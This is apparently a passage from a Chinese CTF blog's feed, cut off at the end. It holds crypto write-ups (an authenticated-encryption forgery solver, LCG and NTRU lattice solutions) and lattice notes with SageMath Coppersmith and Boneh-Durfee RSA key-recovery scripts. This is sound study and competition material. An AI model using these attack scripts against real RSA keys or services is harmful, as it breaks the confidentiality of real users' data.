class="line">finaltag = finaltag.hex()</span><br><span class="line">finalnonce = finalnonce.hex()</span><br><span class="line">finalcipher = finalcipher.hex()</span><br><span class="line"><span class="comment"># print(finaltag)</span></span><br><span class="line"><span class="comment"># print(finalnonce)</span></span><br><span class="line"><span class="comment"># print(finalcipher)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter option &gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter nonce &gt; &quot;</span>)</span><br><span class="line">r.sendline(finalnonce)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter ciphertext &gt; &quot;</span>)</span><br><span class="line">r.sendline(finalcipher)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter tag &gt; &quot;</span>)</span><br><span class="line">r.sendline(finaltag)</span><br><span class="line"></span><br><span class="line">flag = r.recvline()</span><br><span class="line"><span class="keyword">if</span>(<span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag):</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.interactive()</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Writeup-for-红明谷-39-s-crypto&quot;&gt;&lt;a href=&quot;#Writeup-for-红明谷-39-s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Writeup for 红明谷&amp;#39;s crypto&quot;&gt;&lt;/a&gt;Writ</summary>
      
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Writeup for MAR DASCTF&#39;s crypto</title>
    <link href="http://example.com/2021/03/27/Writeup_for_MAR_DASCTF&#39;s_crypto/"/>
    <id>http://example.com/2021/03/27/Writeup_for_MAR_DASCTF&#39;s_crypto/</id>
    <published>2021-03-27T10:30:26.000Z</published>
    <updated>2021-03-27T10:21:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Writeup-for-MAR-DASCTF’s-crypto"><a href="#Writeup-for-MAR-DASCTF’s-crypto" class="headerlink" title="Writeup for MAR DASCTF’s crypto"></a>Writeup for MAR DASCTF’s crypto</h1><h2 id="crypto-threshold"><a href="#crypto-threshold" class="headerlink" title="crypto_threshold"></a>crypto_threshold</h2><p>签到题，给了LCG的所有参数，而且求的还是后一位，求得 $e$</p><p>RSA部分给的<code>_lambda</code>和我上次出的VNCTF的<code>hint</code>是一个样子，求得明文</p><h2 id="FeedBack"><a href="#FeedBack" class="headerlink" title="FeedBack"></a>FeedBack</h2><p>给了个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cycle</span>(<span class="params">c:list,a:list</span>)-&gt;int:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x,y: x+y,map(<span class="keyword">lambda</span> x: x[<span class="number">0</span>]*x[<span class="number">1</span>],zip(c,a)))</span><br></pre></td></tr></table></figure><p>功能就是把 $c$ 和 $a$ 两两相乘再相加</p><p>显然如果有 $key$ ，逆推回去就很容易，那么就想办法找 $key$ 的关系，因为有<br>$$<br>c = \sum_{i=1}^{lenth}m_i\cdot key_i<br>$$<br>结合数据即<br>$$<br>{\begin{bmatrix}<br>x_1&amp;x_2&amp;x_3&amp;\cdots&amp;x_n \\<br>x_2&amp;x_3&amp;x_4&amp;\cdots&amp;x_{n+1} \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>x_n&amp;x_{n+1}&amp;x_{n+2}&amp;\cdots&amp;x_{2n} \\<br>\end{bmatrix}}<br>\cdot<br>{\begin{bmatrix}<br>key_1 \\<br>key_2 \\<br>\vdots \\<br>key_n \\<br>\end{bmatrix}}<br>=<br>{\begin{bmatrix}<br>x_{n+1}&amp;x_{n+2}&amp;x_{n+3}&amp;\cdots&amp;x_{2n}<br>\end{bmatrix}}<br>$$<br>拿到 $key$ 之后，<del>想怎么做怎么做</del></p><h2 id="son-of-NTRU"><a href="#son-of-NTRU" class="headerlink" title="son_of_NTRU"></a>son_of_NTRU</h2><p>数字类的NTRU，甚至是原题，抄起之前的exp直接就秒了（</p><p>NTRU原理不多说了，对矩阵<br>$$<br>M=<br>{\begin{bmatrix}<br>h&amp;1\\<br>p&amp;0<br>\end{bmatrix}}<br>$$<br>一定存在一个向量 $\vec{v}=(f,-k)$ 满足<br>$$<br>\vec{v}\cdot M=\vec{x}=(g,f)<br>$$<br>而且是最短的，格基规约后就能拿到 $g$ 和 $f$ 了</p><h2 id="threshold"><a href="#threshold" class="headerlink" title="threshold"></a>threshold</h2><p><del>还nm是个NTRU，出题人是有多喜欢NTRU</del></p><p>多项式下的NTRU，构造矩阵<br>$$<br>B=<br>{\begin{bmatrix}<br>\pmb{1}&amp;\pmb{h(x)} \\<br>\pmb{0}&amp;\pmb{q}<br>\end{bmatrix}}<br>$$</p><p>格基规约后拿最短的作为新的 $f(x)$ 和 $g(x)$ 重新实现一下解密就能求得 $m(x)$ </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Writeup-for-MAR-DASCTF’s-crypto&quot;&gt;&lt;a href=&quot;#Writeup-for-MAR-DASCTF’s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Writeup for MAR DASCTF’s crypt</summary>
      
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Lattice learning 2</title>
    <link href="http://example.com/2021/03/18/Lattice_learning2/"/>
    <id>http://example.com/2021/03/18/Lattice_learning2/</id>
    <published>2021-03-18T08:19:25.000Z</published>
    <updated>2021-04-03T08:56:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lattice-learning-2"><a href="#Lattice-learning-2" class="headerlink" title="Lattice learning 2"></a>Lattice learning 2</h1><blockquote><p>这篇博客refer的东西太多了，所以要看别的师傅的版本的话可以转路友链里的密码师傅们</p></blockquote><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>格子真是好玩的东西，但是看得再多的博客也不如自己亲自调几个格子来的清楚，比如各种优化或者约束</p><h2 id="Chapher-5-Encryption-mode-in-Lattice"><a href="#Chapher-5-Encryption-mode-in-Lattice" class="headerlink" title="Chapher 5 Encryption mode in Lattice"></a>Chapher 5 Encryption mode in Lattice</h2><h3 id="Coppersmith"><a href="#Coppersmith" class="headerlink" title="Coppersmith"></a>Coppersmith</h3><p>Coppersmith是啥？</p><p><del>铜匠！炼铜！</del></p><p><img src="/img/Lattice_learning/4.png" alt="Coppersmith"></p><p>在我看来就是一种在有限域内解方程的方法，比方说 $f(x)=x^4+114x+514$ 且对于有特殊关系的 $x_0$ 满足关系 $f(x_0)\equiv0\pmod{N}$ ，去求解这样的 $x_0$ 时我们可以使用Coppersmith’s methed。对于度为 $d$ 的多项式 $f(x)$ ，如果这个 $x_0$ 满足 $|x0|&lt; N^{\frac{1}{d}-\varepsilon}$ ，那么就能在多项式的时间内被找出。</p><blockquote><p>假设 $N$ 是一个未知因子组成的数，且存在一个因子 $b\geq N^\beta(0&lt;\beta\leq 1)$ ，$f(x)$ 是一个一元一次 $d$ 阶的多项式，且 $c\geq 1$ ，那么可以在 $O(cd^5log^9(N))$ 的复杂度内求解所有的 $x_0$ 。</p><p>$f(x_0)=0\pmod{b},x_0\leq cN^{\frac{\beta^2}{d}}$</p></blockquote><blockquote><p>这里关于证明，等我有时间<del>把高等代数学会了再</del>回来证</p></blockquote><p>线性代数中我们学过：任何的函数都可以被写成一个基函数的样子，当然求导也是一种线性变换，如下图：<br>$$<br>Basis~functions{=\begin{bmatrix}<br>1\\x\\x^2\\x^3\\\vdots<br>\end{bmatrix}}<br>~~<br>\frac{d}{dx}=<br>{\begin{bmatrix}<br>0&amp;1&amp;0&amp;0&amp;\cdots\\<br>0&amp;0&amp;2&amp;0&amp;\cdots\\<br>0&amp;0&amp;0&amp;3&amp;\cdots\\<br>0&amp;0&amp;0&amp;0&amp;\cdots\\<br>\vdots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots<br>\end{bmatrix}}<br>$$<br>说了这么多，Coppersmith到底是干嘛的？对于一元Coppersmith，它的作用就是找出一个 $F(x)=A\cdot f(x)-N\cdot g(x)$ ，这样就能利用牛顿法求出使得 $F(x)=0$ 的 $x_0$ ，那么此时 $f(x_0)\equiv0$ 也是显而易见的了。</p><p>我们不妨把函数 $f(x)=x^d+a_{d-1}x^{d-1}+\cdots+a_1x+a_0$ 表示成一个类似基函数的向量： $\vec{a}=(a_0,xa_1,x^2a_2,\cdots,x^da_d)$ ，那么只要 $||\vec{a}||&lt;\frac{N}{\sqrt{d+1}}$ 且 $F(x_0)\equiv0\pmod{N}$ ，就有 $f(x_0)\equiv0$ ，关于Coppersmith的证明和界的扩大方法这里指路V神的博客。</p><h4 id="已知部分明文攻击"><a href="#已知部分明文攻击" class="headerlink" title="已知部分明文攻击"></a>已知部分明文攻击</h4><p>设 $m=m_0+x$ ，我们可以找到 $f(x)=(m_0+x)^e-c\pmod{N}$ ，当 $e$ 和 $x$ 较小时，Coppersmith即可计算出 $x$ 的值</p><blockquote><p>$b=N,d=e,\beta=1$ 则 $|x|\leq cN^{\frac{\beta^2}{d}}=cN^{\frac{1}{e}}$ ，因此为了求解，我们至少需要知道关于m至少 $(1-\frac{1}{e})\cdot N.bit_length()$ bit的信息</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">n = </span><br><span class="line">kbits = <span class="comment"># unknow x bit</span></span><br><span class="line">m0 = </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = <span class="comment"># f(x)</span></span><br><span class="line">f = f.monic()</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits,beta=<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">print(x0)</span><br></pre></td></tr></table></figure><h4 id="已知部分因子攻击"><a href="#已知部分因子攻击" class="headerlink" title="已知部分因子攻击"></a>已知部分因子攻击</h4><p>设 $p=p_0+x$ ， $f(x)=p_0+x$ 此时我们把 $N$ 看做 $k\cdot p$ ，又因为 $-p_0\equiv x\pmod{p}$ ，则可以找到 $K\cdot f(x)-M\cdot p=0$</p><blockquote><p>$b=p$ ，且RSA中 $p$ 和 $q$ 通常是满足 $p&lt;q&lt;2p$ 所以 $p\approx N^{0.4}$ ，也就是说 $\beta=0.4$ 附近较为适合，另外 $|x|&lt;N^{\frac{1}{3}}$ ，我们只要知道 $p$ 一半bit就可以求出这样的 $x$ 。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">p0 = </span><br><span class="line">kbits = </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = <span class="comment"># f(x)</span></span><br><span class="line"><span class="comment"># f = f.monic()</span></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line">p = x0 + p0</span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure><h4 id="已知部分私钥攻击"><a href="#已知部分私钥攻击" class="headerlink" title="已知部分私钥攻击"></a>已知部分私钥攻击</h4><p>来自论文《An Attack on RSA Given a Small Fraction of the Private Key Bits》</p><p>设 $d=d_0+x$ ，且 $d_0$ 是私钥 $d$ 的kbits低位，那么显然 $d_0\equiv d\pmod{2^{kbits}}$ ，那么有 $e\cdot d_0=e\cdot d=1+k\cdot\varphi(N)=1+k(N-(p+q)+1)\pmod{2^{kbits}}$ ，</p><p>则通过解方程 $e\cdot d_0\cdot X-k\cdot X\cdot(N-X+1)=X$ 就可以得到所有可能的 $i\cdot p+j\cdot q\pmod{2^{kbits}}$ 的值，接着再求解 $p^2-xp+N=0\pmod{2^{kbits}}$ 即可得到 $p$ 的低位值，将上面两个式子联立，即只需要解一个方程 $e\cdot d_0\cdot X - k\cdot X\cdot(n-X+1) + k\cdot n == X$ 即可得到低位的 $p$ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span>(<span class="params">p0, kbits, n</span>):</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line"></span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span>(<span class="params">d0, kbits, e, n</span>):</span></span><br><span class="line">    X = var(<span class="string">&#x27;X&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">d = </span><br><span class="line">nbits = n.nbits()</span><br><span class="line">kbits = d.nbits()</span><br><span class="line"></span><br><span class="line">p = find_p(d, kbits, e, n)</span><br><span class="line">q = n//p</span><br><span class="line">print(<span class="string">&quot;p = %d&quot;</span> % p)</span><br><span class="line">print(<span class="string">&quot;q = %d&quot;</span> % q)</span><br><span class="line">print(<span class="string">&quot;d0 = %d&quot;</span> % d)</span><br><span class="line">print(<span class="string">&quot;d = %d&quot;</span> % inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)))</span><br></pre></td></tr></table></figure><h3 id="多消息攻击"><a href="#多消息攻击" class="headerlink" title="多消息攻击"></a>多消息攻击</h3><h4 id="线性相关消息攻击"><a href="#线性相关消息攻击" class="headerlink" title="线性相关消息攻击"></a>线性相关消息攻击</h4><p>已知 $c1=m^e\pmod{N}$ ， $c2=(a\cdot m+b)^e\pmod{N}$</p><blockquote><p>首先用 $e=3$ 举个栗子，我们可以通过构造 $m=\frac{m\cdot f(m)}{f(m)}$ 的格式来求 $m$ ，比方说 $e=3$ 时，我们能构造 $m=\frac{b}{a}\cdot\frac{c_2+2a^3c_1-b^3}{c_2-a^3c_1+2b^3}$ </p></blockquote><p>关于更高维的，<del>等我学会就来写</del>，这里指路<a href="https://link.springer.com/content/pdf/10.1007%2F3-540-68339-9_1.pdf">《Low-Exponent RSA with Related Messages》</a></p><h4 id="多消息相关攻击"><a href="#多消息相关攻击" class="headerlink" title="多消息相关攻击"></a>多消息相关攻击</h4><p>Waiting for undate……</p><h4 id="Hastad广播攻击"><a href="#Hastad广播攻击" class="headerlink" title="Hastad广播攻击"></a>Hastad广播攻击</h4><p>Waiting for undate……</p><h4 id="SMUPE攻击"><a href="#SMUPE攻击" class="headerlink" title="SMUPE攻击"></a>SMUPE攻击</h4><p>Waiting for undate……</p><h3 id="Boneh-and-Durfee-attack"><a href="#Boneh-and-Durfee-attack" class="headerlink" title="Boneh and Durfee attack"></a>Boneh and Durfee attack</h3><p>Waiting for undate……</p><p>先放一个别人的版本，等后面自己实现完了之后来换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2020/10/31 23:37</span></span><br><span class="line"><span class="comment"># @Author : A.James</span></span><br><span class="line"><span class="comment"># @FileName: tt6.py</span></span><br><span class="line"><span class="comment"># @Email : alexjames@sina.com</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span>  <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span></span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span>(<span class="params">BB, bound</span>):</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii, jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="keyword">print</span> (a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last 